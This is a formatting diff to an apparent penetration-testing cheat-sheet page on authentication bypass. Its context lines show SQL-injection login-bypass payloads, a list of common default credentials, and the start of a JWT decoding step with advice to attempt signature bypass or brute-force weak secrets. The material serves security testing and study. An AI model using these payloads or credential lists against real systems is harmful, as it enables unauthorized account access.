@@ -5,7 +5,7 @@ title: "Auth Bypass"
 
 Classic login bypass: the query becomes always-true when the comment terminates the password check.
 
-```
+``` wrap
 admin'--
 ' OR '1'='1'--
 admin' #
@@ -15,7 +15,7 @@ admin' #
 
 Always try manufacturer and application defaults before anything else: a surprising number of targets never changed them.
 
-```
+``` wrap
 admin:admin
 admin:password
 admin:123456
@@ -27,7 +27,7 @@ guest:guest
 
 Decode the token to inspect claims and the algorithm, then attempt signature bypass or brute-force a weak secret.
 
-```bash
+```bash wrap
 # Decode
 echo <token> | cut -d. -f2 | base64 -d
 
